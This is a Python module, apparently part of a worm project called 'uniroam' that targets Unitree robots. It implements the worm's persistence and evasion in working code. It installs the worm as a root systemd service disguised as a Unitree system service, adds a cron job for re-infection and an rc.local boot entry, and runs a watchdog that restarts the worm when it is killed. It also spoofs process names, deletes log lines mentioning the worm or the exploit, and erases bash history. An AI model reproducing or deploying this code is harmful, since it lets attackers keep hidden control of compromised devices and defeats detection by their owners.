#!/usr/bin/env python3
"""
Persistence Mechanisms for Worm
Ensures worm survival across reboots and process termination
"""

import os
import sys
import subprocess
import random
from pathlib import Path
from typing import Optional, List
from uniroam import config

# ============================================================================
# Systemd Service Persistence
# ============================================================================

class SystemdPersistence:
    """Install and manage systemd service for persistence"""
    
    @staticmethod
    def create_service_file() -> str:
        """
        Create systemd service file content
        
        Returns:
            Service file content as string
        """
        service_content = f"""[Unit]
Description=Unitree Robot System Service
After=network.target bluetooth.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {config.WORM_INSTALL_PATH}
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier={config.SYSTEMD_SERVICE_NAME}
User=root

[Install]
WantedBy=multi-user.target
"""
        return service_content
    
    @staticmethod
    def install_service(worm_path: str) -> bool:
        """
        Install systemd service
        
        Args:
            worm_path: Path to worm executable/script
        
        Returns:
            True if installation successful
        """
        try:
            # Copy worm to installation location
            subprocess.run(['cp', worm_path, config.WORM_INSTALL_PATH], check=True)
            subprocess.run(['chmod', '+x', config.WORM_INSTALL_PATH], check=True)
            
            # Create service file
            service_content = SystemdPersistence.create_service_file()
            with open(config.SYSTEMD_SERVICE_PATH, 'w') as f:
                f.write(service_content)
            
            # Enable and start service
            subprocess.run(['systemctl', 'daemon-reload'], check=True)
            subprocess.run(['systemctl', 'enable', config.SYSTEMD_SERVICE_NAME], check=True)
            subprocess.run(['systemctl', 'start', config.SYSTEMD_SERVICE_NAME], check=True)
            
            return True
        
        except Exception as e:
            return False
    
    @staticmethod
    def remove_service() -> bool:
        """
        Remove systemd service (for cleanup)
        
        Returns:
            True if removal successful
        """
        try:
            subprocess.run(['systemctl', 'stop', config.SYSTEMD_SERVICE_NAME], check=False)
            subprocess.run(['systemctl', 'disable', config.SYSTEMD_SERVICE_NAME], check=False)
            
            if Path(config.SYSTEMD_SERVICE_PATH).exists():
                os.remove(config.SYSTEMD_SERVICE_PATH)
            
            if Path(config.WORM_INSTALL_PATH).exists():
                os.remove(config.WORM_INSTALL_PATH)
            
            subprocess.run(['systemctl', 'daemon-reload'], check=True)
            
            return True
        
        except Exception:
            return False

# ============================================================================
# Cron Persistence
# ============================================================================

class CronPersistence:
    """Install cron job for periodic re-infection"""
    
    @staticmethod
    def get_cron_entry() -> str:
        """
        Create cron entry
        
        Returns:
            Cron entry string
        """
        return f"{config.CRON_SCHEDULE} /usr/bin/python3 {config.WORM_INSTALL_PATH} >/dev/null 2>&1"
    
    @staticmethod
    def install_cron(worm_path: str) -> bool:
        """
        Install cron job
        
        Args:
            worm_path: Path to worm executable
        
        Returns:
            True if installation successful
        """
        try:
            # Copy worm to installation location
            subprocess.run(['cp', worm_path, config.WORM_INSTALL_PATH], check=True)
            subprocess.run(['chmod', '+x', config.WORM_INSTALL_PATH], check=True)
            
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            # Add our entry if not present
            cron_entry = CronPersistence.get_cron_entry()
            if cron_entry not in current_cron:
                new_cron = current_cron + f"\n{cron_entry}\n"
                
                # Install new crontab
                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                process.communicate(input=new_cron)
                
                return process.returncode == 0
            
            return True
        
        except Exception:
            return False
    
    @staticmethod
    def remove_cron() -> bool:
        """
        Remove cron job (for cleanup)
        
        Returns:
            True if removal successful
        """
        try:
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            if result.returncode != 0:
                return True
            
            current_cron = result.stdout
            cron_entry = CronPersistence.get_cron_entry()
            
            # Remove our entry
            new_cron = '\n'.join([line for line in current_cron.split('\n') 
                                  if cron_entry not in line])
            
            # Install cleaned crontab
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
            process.communicate(input=new_cron)
            
            return True
        
        except Exception:
            return False

# ============================================================================
# RC Script Persistence
# ============================================================================

class RCPersistence:
    """Install RC script for boot-time execution"""
    
    @staticmethod
    def install_rc_local(worm_path: str) -> bool:
        """
        Add entry to /etc/rc.local
        
        Args:
            worm_path: Path to worm executable
        
        Returns:
            True if installation successful
        """
        try:
            rc_local_path = Path('/etc/rc.local')
            
            # Copy worm to installation location
            subprocess.run(['cp', worm_path, config.WORM_INSTALL_PATH], check=True)
            subprocess.run(['chmod', '+x', config.WORM_INSTALL_PATH], check=True)
            
            # Read current rc.local
            if rc_local_path.exists():
                with open(rc_local_path, 'r') as f:
                    rc_content = f.read()
            else:
                rc_content = "#!/bin/sh -e\n"
            
            # Add our entry if not present
            worm_entry = f"/usr/bin/python3 {config.WORM_INSTALL_PATH} &\n"
            
            if worm_entry not in rc_content:
                # Insert before 'exit 0' if present
                if 'exit 0' in rc_content:
                    rc_content = rc_content.replace('exit 0', f'{worm_entry}\nexit 0')
                else:
                    rc_content += f'\n{worm_entry}\nexit 0\n'
                
                with open(rc_local_path, 'w') as f:
                    f.write(rc_content)
                
                subprocess.run(['chmod', '+x', '/etc/rc.local'], check=True)
            
            return True
        
        except Exception:
            return False

# ============================================================================
# Watchdog Process
# ============================================================================

class WatchdogPersistence:
    """Watchdog process to restart worm if killed"""
    
    @staticmethod
    def create_watchdog_script(worm_path: str) -> str:
        """
        Create watchdog script content
        
        Args:
            worm_path: Path to worm executable
        
        Returns:
            Watchdog script as string
        """
        watchdog_script = f"""#!/bin/bash
# Watchdog for worm persistence

WORM_PATH="{worm_path}"
CHECK_INTERVAL=60

while true; do
    if ! pgrep -f "$WORM_PATH" > /dev/null; then
        /usr/bin/python3 "$WORM_PATH" &
    fi
    sleep $CHECK_INTERVAL
done
"""
        return watchdog_script
    
    @staticmethod
    def install_watchdog(worm_path: str) -> bool:
        """
        Install watchdog process
        
        Args:
            worm_path: Path to worm executable
        
        Returns:
            True if installation successful
        """
        try:
            watchdog_path = "/usr/local/bin/unitree-watchdog"
            
            # Create watchdog script
            script_content = WatchdogPersistence.create_watchdog_script(worm_path)
            with open(watchdog_path, 'w') as f:
                f.write(script_content)
            
            subprocess.run(['chmod', '+x', watchdog_path], check=True)
            
            # Start watchdog in background
            subprocess.Popen([watchdog_path], start_new_session=True)
            
            return True
        
        except Exception:
            return False

# ============================================================================
# Process Obfuscation
# ============================================================================

class ProcessObfuscation:
    """Obfuscate process name to avoid detection"""
    
    @staticmethod
    def set_process_name(name: Optional[str] = None):
        """
        Set process name to blend in
        
        Args:
            name: Process name (random system process if None)
        """
        if name is None:
            name = random.choice(config.PROCESS_NAMES)
        
        try:
            # Try using setproctitle if available
            import setproctitle
            setproctitle.setproctitle(name)
        except ImportError:
            # Fallback: modify argv
            if len(sys.argv) > 0:
                sys.argv[0] = name

# ============================================================================
# Log Cleaning
# ============================================================================

class LogCleaner:
    """Clean logs to remove infection evidence"""
    
    @staticmethod
    def clean_system_logs():
        """Remove infection-related entries from system logs"""
        if not config.CLEAN_LOGS:
            return
        
        try:
            for log_path in config.TARGET_LOGS:
                log_file = Path(log_path).expanduser()
                
                if not log_file.exists():
                    continue
                
                # Read log
                with open(log_file, 'r') as f:
                    lines = f.readlines()
                
                # Filter out suspicious entries
                cleaned_lines = []
                suspicious_keywords = ['unitree', 'worm', 'exploit', 'BLE', 'infection']
                
                for line in lines:
                    if not any(keyword in line.lower() for keyword in suspicious_keywords):
                        cleaned_lines.append(line)
                
                # Write cleaned log
                with open(log_file, 'w') as f:
                    f.writelines(cleaned_lines)
        
        except Exception:
            pass
    
    @staticmethod
    def clear_bash_history():
        """Clear bash history"""
        try:
            bash_history = Path.home() / '.bash_history'
            if bash_history.exists():
                bash_history.unlink()
            
            # Disable history for current session
            os.system('unset HISTFILE')
        except Exception:
            pass

# ============================================================================
# Master Persistence Manager
# ============================================================================

class PersistenceManager:
    """Manage all persistence mechanisms"""
    
    def __init__(self, worm_path: str):
        """
        Initialize persistence manager
        
        Args:
            worm_path: Path to worm executable
        """
        self.worm_path = worm_path
        self.installed_mechanisms: List[str] = []
    
    def install_all(self) -> dict:
        """
        Install all persistence mechanisms
        
        Returns:
            Dict with installation results
        """
        results = {}
        
        # Obfuscate process name first
        ProcessObfuscation.set_process_name()
        results['process_obfuscation'] = True
        
        # Try systemd (preferred)
        if SystemdPersistence.install_service(self.worm_path):
            self.installed_mechanisms.append('systemd')
            results['systemd'] = True
        else:
            results['systemd'] = False
        
        # Install cron job (backup)
        if CronPersistence.install_cron(self.worm_path):
            self.installed_mechanisms.append('cron')
            results['cron'] = True
        else:
            results['cron'] = False
        
        # Install RC script (additional backup)
        if RCPersistence.install_rc_local(self.worm_path):
            self.installed_mechanisms.append('rc_local')
            results['rc_local'] = True
        else:
            results['rc_local'] = False
        
        # Install watchdog
        if WatchdogPersistence.install_watchdog(self.worm_path):
            self.installed_mechanisms.append('watchdog')
            results['watchdog'] = True
        else:
            results['watchdog'] = False
        
        # Clean logs
        LogCleaner.clean_system_logs()
        LogCleaner.clear_bash_history()
        results['log_cleaning'] = True
        
        return results
    
    def remove_all(self) -> bool:
        """
        Remove all persistence mechanisms (cleanup)
        
        Returns:
            True if all removals successful
        """
        success = True
        
        if 'systemd' in self.installed_mechanisms:
            success &= SystemdPersistence.remove_service()
        
        if 'cron' in self.installed_mechanisms:
            success &= CronPersistence.remove_cron()
        
        # Note: RC local and watchdog cleanup would require manual intervention
        
        return success

# ============================================================================
# Convenience Functions
# ============================================================================

def establish_persistence(worm_path: str = None) -> dict:
    """
    Establish persistence using all available mechanisms
    
    Args:
        worm_path: Path to worm (defaults to current script)
    
    Returns:
        Dict with installation results
    """
    if worm_path is None:
        worm_path = os.path.abspath(sys.argv[0])
    
    manager = PersistenceManager(worm_path)
    return manager.install_all()

def cleanup_persistence() -> bool:
    """
    Remove all persistence mechanisms
    
    Returns:
        True if cleanup successful
    """
    manager = PersistenceManager('')
    manager.installed_mechanisms = ['systemd', 'cron', 'rc_local', 'watchdog']
    return manager.remove_all()

